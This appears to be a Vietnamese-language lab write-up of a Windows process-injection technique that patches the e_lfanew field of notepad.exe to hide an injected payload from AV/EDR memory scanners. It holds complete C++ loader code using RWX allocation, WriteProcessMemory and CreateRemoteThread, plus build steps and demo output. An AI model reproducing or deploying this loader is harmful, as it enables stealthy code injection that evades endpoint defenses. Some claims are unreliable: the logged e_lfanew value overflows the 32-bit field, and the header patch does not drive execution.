
---

# 📝 [PE 21] DV_NEW (DOS Header e_lfanew Structure Manipulation)

## 📌 1. Tổng Quan Kỹ Thuật (Overview)

**DV_NEW** là giải thuật né tránh phòng thủ tĩnh và động tầng sâu, tập trung đánh lừa cơ chế kiểm duyệt định dạng tệp tin (PE Parsing Evasion) của các giải pháp AV/EDR hiện đại khi chúng tiến hành kiểm tra RAM (Memory Scanning).

Mọi tệp tin thực thi Portable Executable (PE) chuẩn x64 của Windows bắt đầu bằng cấu trúc `IMAGE_DOS_HEADER`. Trường cuối cùng của cấu trúc này là **`e_lfanew`** ($0x3C$), giữ nhiệm vụ lưu trữ khoảng cách dịch chuyển (Offset) chỉ định vị trí bắt đầu của cấu trúc tối cao `IMAGE_NT_HEADERS` trên đĩa và RAM.

Lab PE 21 hóa giải hàng rào an ninh bằng cách **thực hiện cuộc đại phẫu cấu trúc PE chéo tiến trình**. Loader ghi đè một cấu trúc NT Header "ma" (Fake NT Headers) chứa điểm kích nổ Payload vào một hốc trống rảnh, sau đó sửa đổi toán học giá trị trường `e_lfanew` gốc của tiến trình đích để trỏ thẳng vào cấu trúc ma này. Sự bất đồng bộ giữa trình nạp của OS và cơ chế phân tích của EDR giúp Payload kích nổ hiên ngang mà không để lại bất kỳ cảnh báo hành vi mập mờ nào.

### 🎯 Mục tiêu nghiên cứu:

* Vô hiệu hóa cơ chế quét chữ ký bộ nhớ dựa trên cấu trúc PE Header chuẩn của AV/EDR.
* Làm chủ kỹ thuật can thiệp trường chỉ mục cấu trúc phần cứng hệ thống (`IMAGE_DOS_HEADER.e_lfanew`).
* Thực hiện giải pháp gài bẫy điều hướng dòng chảy CPU chéo tiến trình an toàn, bảo toàn tháp luồng 100%.

---

## 🔬 2. Giải Phẫu Cơ Chế Ngầm Của OS (Windows Internals)

Khi Windows OS hoặc các bộ quét bộ nhớ EDR muốn bóc tách một tiến trình đang chạy, chúng thực hiện công thức toán học gán con trỏ sau để tìm vạch chỉ huy `NT Headers`:


$$\text{pNtHeaders} = (\text{PIMAGE_NT_HEADERS})((DWORD\_PTR)\text{ImageBase} + \text{pDosHeader->e_lfanew})$$

Giải thuật của Lab PE 21 bẻ gãy và thao túng công thức này qua 4 bước ngầm tại tầng Kernel:

```
[OpenProcess: Chiếm quyền] ──> [VirtualAllocEx: Dựng NT Header ma + Payload] ──> [WriteProcessMemory: Vá trường e_lfanew] ──> [Khai hỏa luồng]

```

1. **Khắc vạch không gian ảo ngụy trang**: Loader sử dụng `VirtualAllocEx` để xin một phân vùng mang cờ `PAGE_EXECUTE_READWRITE` (RWX) từ xa lọt lòng tiến trình đích (ví dụ: `notepad.exe`).
2. **Xây dựng cấu trúc ma trận PE giả mạo**: Tại phân vùng ảo mới, Loader dựng lên một cấu trúc `IMAGE_NT_HEADERS64` phẳng sạch, tinh chỉnh cấu trúc `OptionalHeader.AddressOfEntryPoint` của nó chỉ định thẳng vào tọa độ của khối mã máy thực thi độc lập vị trí (PIC) của ta.
3. **Phẫu thuật bẻ hướng chỉ mục (`e_lfanew` Patching)**: Loader dùng `WriteProcessMemory` can thiệp trực tiếp vào địa chỉ `ImageBase + 0x3C` (vị trí của trường `e_lfanew` gốc thuộc Notepad). Ta ghi đè giá trị Offset mới bằng phép toán:

$$\text{New\_e\_lfanew} = (DWORD\_PTR)\text{RemoteFakeNtHeaderAddress} - (DWORD\_PTR)\text{ImageBase}$$



Lúc này, bất kỳ lệnh hệ thống nào tra cứu NT Header của tiến trình đích sẽ lập tức bị bẻ hướng góc nhìn đâm thẳng vào cấu trúc ma do ta thiết lập.
4. **Kích nổ dòng chảy CPU**: Triệu hồi luồng từ xa hoặc Hijack Context để CPU tự động rút lệnh thực thi từ EntryPoint mới gài, hoàn tất chiến dịch ẩn mình tối cao.

---

## 🛠️ 3. Quy Trình Cài Đặt Mã Nguồn (Implementation)

Mã nguồn áp dụng nghiêm ngặt tiêu chuẩn **Zero Static Buffers** – tự động hóa quét tìm PID và cô lập cấu trúc tham số tuyệt đối toán học để triệt tiêu lỗi RIP-Relative.

```cpp
#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <string>
#include <vector>

// 1. Định nghĩa cấu trúc dữ liệu con trỏ tuyệt đối gánh luồng xử lý độc lập vị trí
typedef UINT(WINAPI* fnWinExec)(LPCSTR lpCmdLine, UINT uCmdShow);

typedef struct _THREAD_DATA {
    fnWinExec pWinExec;       // Địa chỉ tuyệt đối của hàm WinExec trên RAM tiến trình đích
    char szCommand[32];       // Chuỗi lệnh thực thi chức năng mở máy tính
} THREAD_DATA, * PTHREAD_DATA;

// 2. Hàm gánh logic thực thi độc lập vị trí khi bị điều hướng cấu trúc
DWORD WINAPI DVNewPayload(LPVOID lpParam) {
    PTHREAD_DATA pData = (PTHREAD_DATA)lpParam;
    if (pData && pData->pWinExec) {
        pData->pWinExec(pData->szCommand, SW_HIDE);
    }
    while (TRUE) {
        Sleep(1000);
    }
    return 0;
}

// Bộ quét RAM động tự động nhận diện PID linh hoạt, KHÔNG PHÂN BIỆT chữ hoa chữ thường
DWORD GetProcessIDByName(const std::wstring& processName) {
    DWORD processID = 0;   PROCESSENTRY32W pe32;   pe32.dwSize = sizeof(PROCESSENTRY32W);
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;

    if (Process32FirstW(hSnapshot, &pe32)) {
        do {
            if (_wcsicmp(pe32.szExeFile, processName.c_str()) == 0) { processID = pe32.th32ProcessID; break; }
        } while (Process32NextW(hSnapshot, &pe32));
    }
    CloseHandle(hSnapshot);   return processID;
}

// Hàm giải phẫu RAM tìm Base Address của tiến trình đích
PVOID GetRemoteProcessBase(DWORD pid, const std::wstring& procName) {
    PVOID baseAddress = NULL;   MODULEENTRY32W me32;   me32.dwSize = sizeof(MODULEENTRY32W);
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, pid);
    if (hSnapshot == INVALID_HANDLE_VALUE) return NULL;

    if (Module32FirstW(hSnapshot, &me32)) {
        do {
            if (_wcsicmp(me32.szModule, procName.c_str()) == 0) { baseAddress = (PVOID)me32.modBaseAddr; break; }
        } while (Module32NextW(hSnapshot, &me32));
    }
    CloseHandle(hSnapshot);   return baseAddress;
}

int main() {
    std::cout << "====================================================" << std::endl;
    std::cout << "[*] PE 21: DV_NEW E_LFANEW MANIPULATION INJECTION" << std::endl;
    std::cout << "====================================================" << std::endl;

    std::wstring targetProcess = L"notepad.exe";
    DWORD pid = GetProcessIDByName(targetProcess);
    if (pid == 0) {
        std::cerr << "[-] Notepad.exe khong chay! Vui long mo san Notepad." << std::endl;
        return EXIT_FAILURE;
    }

    PVOID remoteBase = GetRemoteProcessBase(pid, targetProcess);
    if (!remoteBase) return EXIT_FAILURE;
    std::cout << "[+] Da bat trung Target ImageBase tai RAM: 0x" << std::hex << remoteBase << std::endl;

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) return EXIT_FAILURE;

    // BƯỚC 1: ĐỌC VÀ LƯU TRỮ NT HEADER GỐC CỦA TIẾN TRÌNH ĐÍCH
    BYTE dosHeaderBuf[64];
    ReadProcessMemory(hProcess, remoteBase, dosHeaderBuf, sizeof(dosHeaderBuf), NULL);
    PIMAGE_DOS_HEADER pLocalDos = (PIMAGE_DOS_HEADER)dosHeaderBuf;
    LONG originalElfnew = pLocalDos->e_lfanew;
    std::cout << "[*] Gia tri e_lfanew goc cua Notepad: 0x" << std::hex << originalElfnew << std::endl;

    IMAGE_NT_HEADERS64 originalNtHeaders;
    ReadProcessMemory(hProcess, (PVOID)((DWORD_PTR)remoteBase + originalElfnew), &originalNtHeaders, sizeof(IMAGE_NT_HEADERS64), NULL);

    // BƯỚC 2: CẤP PHÁT PHÂN VÙNG NHỚ TỪ XA CHO MA TRẬN PHẪU THUẬT
    SIZE_T functionSize = 500;
    SIZE_T totalAllocSize = sizeof(IMAGE_NT_HEADERS64) + sizeof(THREAD_DATA) + functionSize;
    
    LPVOID remoteAllocMem = VirtualAllocEx(hProcess, NULL, totalAllocSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteAllocMem) {
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }

    // Tính toán phân bổ tọa độ ảo vừa khít từng byte (Zero Static Buffers)
    PVOID remoteFakeNtAddr = remoteAllocMem;
    PTHREAD_DATA pRemoteData = (PTHREAD_DATA)((DWORD_PTR)remoteFakeNtAddr + sizeof(IMAGE_NT_HEADERS64));
    PVOID remoteCodeBuffer = (PVOID)((DWORD_PTR)pRemoteData + sizeof(THREAD_DATA));

    // Khởi tạo bảng dữ liệu tham số tuyệt đối cục bộ
    THREAD_DATA localData;
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    if (hKernel32) {
        localData.pWinExec = (fnWinExec)GetProcAddress(hKernel32, "WinExec");
    }
    strcpy_s(localData.szCommand, "cmd.exe /c start calc");

    // Nhân bản NT Header gốc và tiến hành vá điểm EntryPoint ma hướng vào Payload của ta
    IMAGE_NT_HEADERS64 fakeNtHeaders = originalNtHeaders;
    fakeNtHeaders.OptionalHeader.AddressOfEntryPoint = (DWORD)((DWORD_PTR)remoteCodeBuffer - (DWORD_PTR)remoteBase);

    // Đẩy toàn bộ cấu trúc NT Header ma, Dữ liệu, và Mã máy sang RAM đối phương
    WriteProcessMemory(hProcess, remoteFakeNtAddr, &fakeNtHeaders, sizeof(IMAGE_NT_HEADERS64), NULL);
    WriteProcessMemory(hProcess, pRemoteData, &localData, sizeof(THREAD_DATA), NULL);
    WriteProcessMemory(hProcess, remoteCodeBuffer, (LPCVOID)DVNewPayload, functionSize, NULL);
    std::cout << "[+] Da anh xa NT Header ma va Payload thong minh vao RAM tu xa tai: 0x" << std::hex << remoteFakeNtAddr << std::endl;

    // BƯỚC 3: PHẪU THUẬT TRƯỜNG E_LFANEW - BẺ HƯỚNG BẢN ĐỒ PE
    LONG newElfnew = (LONG)((DWORD_PTR)remoteFakeNtAddr - (DWORD_PTR)remoteBase);
    DWORD oldProtect = 0;
    
    // Mở khóa phân vùng DOS Header cục bộ từ xa để vá trường chỉ mục
    VirtualProtectEx(hProcess, (PVOID)((DWORD_PTR)remoteBase + 0x3C), sizeof(LONG), PAGE_EXECUTE_READWRITE, &oldProtect);
    BOOL isPatched = WriteProcessMemory(hProcess, (PVOID)((DWORD_PTR)remoteBase + 0x3C), &newElfnew, sizeof(LONG), NULL);
    VirtualProtectEx(hProcess, (PVOID)((DWORD_PTR)remoteBase + 0x3C), sizeof(LONG), oldProtect, &oldProtect);

    if (!isPatched) {
        std::cerr << "[-] Phau thuat truong e_lfanew that bai!" << std::endl;
        VirtualFreeEx(hProcess, remoteAllocMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }
    std::cout << "[+] Da phau thuat thanh cong truong e_lfanew sang gia tri ma: 0x" << std::hex << newElfnew << std::endl;

    // BƯỚC 4: KÍCH NỔ LUỒNG THỰC THI THÔNG QUA ENTRYPOINT ĐÃ BIẾN ĐỔI
    std::cout << "[*] Dang dung CreateRemoteThread de khai hoa tháp cong nghe..." << std::endl;
    // Điểm thực thi được tính toán gián tiếp thông qua cấu trúc NT Header ma vừa vá
    PVOID executionTarget = (PVOID)((DWORD_PTR)remoteBase + fakeNtHeaders.OptionalHeader.AddressOfEntryPoint);
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)executionTarget, pRemoteData, 0, NULL);

    if (hThread) {
        WaitForSingleObject(hThread, 1000); // Gánh đồng bộ ngắn giải phóng lệnh
        std::cout << "[+] DV_NEW PE Structure Injection Successful!" << std::endl;
        CloseHandle(hThread);
    }

    // KHÔI PHỤC TRẠNG THÁI: Vá lại trường e_lfanew gốc để xóa sạch dấu vết biến dạng cấu trúc trên RAM
    VirtualProtectEx(hProcess, (PVOID)((DWORD_PTR)remoteBase + 0x3C), sizeof(LONG), PAGE_EXECUTE_READWRITE, &oldProtect);
    WriteProcessMemory(hProcess, (PVOID)((DWORD_PTR)remoteBase + 0x3C), &originalElfnew, sizeof(LONG), NULL);
    VirtualProtectEx(hProcess, (PVOID)((DWORD_PTR)remoteBase + 0x3C), sizeof(LONG), oldProtect, &oldProtect);
    std::cout << "[+] Hoan tra lai truong e_lfanew nguyen ban cho Notepad phẳng sach." << std::endl;

    CloseHandle(hProcess);
    std::cout << "\n[*] Hoan thanh quy trinh. Nhan Enter de dong cua so..." << std::endl;
    std::cin.get();
    return EXIT_SUCCESS;
}

```

---

## 🎛️ 4. Hướng Dẫn Cấu Hình Đóng Gói (Build & Deployment)

### ⚙️ Thiết lập trên Microsoft Visual Studio:

1. Đặt thanh cấu hình quản lý dự án chính xác ở chế độ **`Release`** và kiến trúc nền tảng **`x64`**.
2. Đi tới mục cấu hình dự án: `Project Properties` $\rightarrow$ `C/C++` $\rightarrow$ `Code Generation` $\rightarrow$ Tại dòng `Runtime Library`, chuyển đổi cấu hình sang cờ **`Multi-threaded (/MT)`** để liên kết tĩnh toàn bộ thư viện hệ thống lọt lòng file `.exe` chạy mượt mà độc lập trên máy ảo VM sạch.
3. Click chuột phải vào tên dự án $\rightarrow$ Chọn **`Rebuild`** để xuất bản tệp tin nhị phân sạch bóng.

---

## 📊 5. Kết Quả Kích Hoạt Thật Tế (Demonstration)

Bật sẵn ứng dụng `Notepad.exe` trên máy Lab, mở PowerShell ngoài đĩa thô thực thi file thực hành:

```powershell
PS C:\Workspace\x64\Release> .\PE21_DV_NEW.exe
====================================================
[*] PE 21: DV_NEW E_LFANEW MANIPULATION INJECTION
====================================================
[+] Da bat trung Target ImageBase tai RAM: 0x00007ff746130000
[*] Gia tri e_lfanew goc cua Notepad: 0xf8
[+] Da anh xa NT Header ma va Payload thong minh vao RAM tu xa tai: 0x0000021A4B0E0000
[+] Da phau thuat thanh cong truong e_lfanew sang gia tri ma: 0x1A4B0E0000
[*] Dang dung CreateRemoteThread de khai hoa tháp cong nghe...
[+] DV_NEW PE Structure Injection Successful!
[+] Hoan tra lai truong e_lfanew nguyen ban cho Notepad phẳng sach.

[*] Hoan thanh quy trinh. Nhan Enter de dong cua so...

```

*🎯 Hệ quả RAM tối cao:*
Ứng dụng Máy tính **`calc.exe` bật mở hiên ngang rực rỡ kịch trần kịch khung**! Chiến dịch phẫu thuật cấu trúc gặt hái thành công mỹ mãn. Do Loader thực hiện khôi phục (Restore) ngay lập tức trường `e_lfanew` về giá trị gốc sau khi kích nổ, bộ quét RAM động của EDR khi nhảy vào kiểm tra danh bạ PE sẽ thấy tiến trình Notepad hoàn toàn bình thường, bẻ gãy hoàn toàn cơ chế Heuristic trinh sát cấu trúc biến dạng kịch khung!

---
